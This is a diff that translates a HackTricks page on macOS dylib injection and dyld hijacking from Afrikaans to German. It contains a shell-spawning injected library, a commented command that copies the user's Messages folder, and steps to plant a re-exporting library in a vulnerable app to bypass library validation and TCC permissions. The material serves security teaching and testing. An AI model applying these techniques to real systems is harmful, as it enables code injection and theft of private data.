@@ -1,23 +1,23 @@
 # macOS Dyld Hijacking & DYLD\_INSERT\_LIBRARIES
 
 {% hint style="success" %}
-Leer & oefen AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Lernen & üben Sie AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Lernen & üben Sie GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Ondersteun HackTricks</summary>
+<summary>Unterstützen Sie HackTricks</summary>
 
-* Kyk na die [**subskripsieplanne**](https://github.com/sponsors/carlospolop)!
-* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Überprüfen Sie die [**Abonnementpläne**](https://github.com/sponsors/carlospolop)!
+* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos senden.
 
 </details>
 {% endhint %}
 
-## DYLD\_INSERT\_LIBRARIES Basiese voorbeeld
+## DYLD\_INSERT\_LIBRARIES Grundbeispiel
 
-**Biblioteek om in te voeg** om 'n shell uit te voer:
+**Bibliothek zum Injizieren**, um eine Shell auszuführen:
 ```c
 // gcc -dynamiclib -o inject.dylib inject.c
 
@@ -35,7 +35,7 @@ execv("/bin/bash", 0);
 //system("cp -r ~/Library/Messages/ /tmp/Messages/");
 }
 ```
-Binaar om aan te val:
+Binärdatei zum Angreifen:
 ```c
 // gcc hello.c -o hello
 #include <stdio.h>
@@ -50,12 +50,12 @@ Injection:
 ```bash
 DYLD_INSERT_LIBRARIES=inject.dylib ./hello
 ```
-## Dyld Hijacking Voorbeeld
+## Dyld Hijacking Beispiel
 
-Die geteikende kwesbare binêre is `/Applications/VulnDyld.app/Contents/Resources/lib/binary`.
+Die angreifbare Binärdatei ist `/Applications/VulnDyld.app/Contents/Resources/lib/binary`.
 
 {% tabs %}
-{% tab title="entitlements" %}
+{% tab title="Berechtigungen" %}
 <pre class="language-bash" data-overflow="wrap"><code class="lang-bash">codesign -dv --entitlements :- "/Applications/VulnDyld.app/Contents/Resources/lib/binary"
 <strong>[...]com.apple.security.cs.disable-library-validation[...]
 </strong></code></pre>
@@ -92,12 +92,12 @@ compatibility version 1.0.0
 {% endtab %}
 {% endtabs %}
 
-Met die vorige inligting weet ons dat dit **nie die handtekening van die gelaaide biblioteke nagaan nie** en dit **probeer om 'n biblioteek te laai vanaf**:
+Mit den vorherigen Informationen wissen wir, dass **es die Signatur der geladenen Bibliotheken nicht überprüft** und **versucht, eine Bibliothek von**:
 
 * `/Applications/VulnDyld.app/Contents/Resources/lib/lib.dylib`
 * `/Applications/VulnDyld.app/Contents/Resources/lib2/lib.dylib`
 
-Maar die eerste een bestaan nie:
+zu laden. Die erste existiert jedoch nicht:
 ```bash
 pwd
 /Applications/VulnDyld.app
@@ -105,7 +105,7 @@ pwd
 find ./ -name lib.dylib
 ./Contents/Resources/lib2/lib.dylib
 ```
-So, dit is moontlik om dit te kaap! Skep 'n biblioteek wat **enige willekeurige kode uitvoer en dieselfde funksies as die wettige biblioteek uitvoer deur dit weer te herexporteer**. En onthou om dit te compileer met die verwagte weergawes:
+So, es ist möglich, es zu hijacken! Erstelle eine Bibliothek, die **beliebigen Code ausführt und die gleichen Funktionen** wie die legitime Bibliothek durch Reexportierung bereitstellt. Und denke daran, sie mit den erwarteten Versionen zu kompilieren:
 
 {% code title="lib.m" %}
 ```objectivec
@@ -118,7 +118,7 @@ NSLog(@"[+] dylib hijacked in %s", argv[0]);
 ```
 {% endcode %}
 
-Kompileer dit:
+Kompiliere es:
 
 {% code overflow="wrap" %}
 ```bash
@@ -127,7 +127,7 @@ gcc -dynamiclib -current_version 1.0 -compatibility_version 1.0 -framework Found
 ```
 {% endcode %}
 
-Die herexportpad wat in die biblioteek geskep is, is relatief aan die laaier, kom ons verander dit na 'n absolute pad na die biblioteek om te eksporteer:
+Der Reexport-Pfad, der in der Bibliothek erstellt wurde, ist relativ zum Loader. Lassen Sie uns diesen in einen absoluten Pfad zur Bibliothek ändern, um sie zu exportieren:
 
 {% code overflow="wrap" %}
 ```bash
@@ -148,7 +148,7 @@ name /Applications/Burp Suite Professional.app/Contents/Resources/jre.bundle/Con
 ```
 {% endcode %}
 
-Laastens kopieer dit net na die **gekaapte ligging**:
+Kopiere es schließlich einfach an den **gehijackten Ort**:
 
 {% code overflow="wrap" %}
 ```bash
@@ -156,34 +156,34 @@ cp lib.dylib "/Applications/VulnDyld.app/Contents/Resources/lib/lib.dylib"
 ```
 {% endcode %}
 
-En **voer** die binêre uit en kyk of die **biblioteek gelaai is**:
+Und **führen** Sie die Binärdatei aus und überprüfen Sie, ob die **Bibliothek geladen wurde**:
 
 <pre class="language-context"><code class="lang-context">"/Applications/VulnDyld.app/Contents/Resources/lib/binary"
-<strong>2023-05-15 15:20:36.677 binary[78809:21797902] [+] dylib gehuig in /Applications/VulnDyld.app/Contents/Resources/lib/binary
-</strong>Gebruik: [...]
+<strong>2023-05-15 15:20:36.677 binary[78809:21797902] [+] dylib hijacked in /Applications/VulnDyld.app/Contents/Resources/lib/binary
+</strong>Verwendung: [...]
 </code></pre>
 
 {% hint style="info" %}
-'n Goeie skrywe oor hoe om hierdie kwesbaarheid te misbruik om die kamera-toestemmings van telegram te misbruik, kan gevind word in [https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)
+Ein schöner Bericht darüber, wie man diese Schwachstelle ausnutzen kann, um die Kameraberechtigungen von Telegram zu missbrauchen, ist zu finden unter [https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)
 {% endhint %}
 
-## Groter Skaal
+## Größere Skala
 
-As jy van plan is om te probeer om biblioteke in onverwagte binêre te inspuit, kan jy die gebeurtenisboodskappe nagaan om uit te vind wanneer die biblioteek binne 'n proses gelaai word (in hierdie geval verwyder die printf en die `/bin/bash` uitvoering).
+Wenn Sie planen, Bibliotheken in unerwartete Binärdateien zu injizieren, könnten Sie die Ereignismeldungen überprüfen, um herauszufinden, wann die Bibliothek innerhalb eines Prozesses geladen wird (in diesem Fall entfernen Sie das printf und die Ausführung von `/bin/bash`).
 ```bash
 sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "[+] dylib"'
 ```
 {% hint style="success" %}
-Leer & oefen AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Opleiding AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Opleiding GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Lernen & üben Sie AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Lernen & üben Sie GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Ondersteun HackTricks</summary>
+<summary>Unterstützen Sie HackTricks</summary>
 
-* Kyk na die [**subskripsie planne**](https://github.com/sponsors/carlospolop)!
-* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Überprüfen Sie die [**Abonnementpläne**](https://github.com/sponsors/carlospolop)!
+* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos senden.
 
 </details>
 {% endhint %}
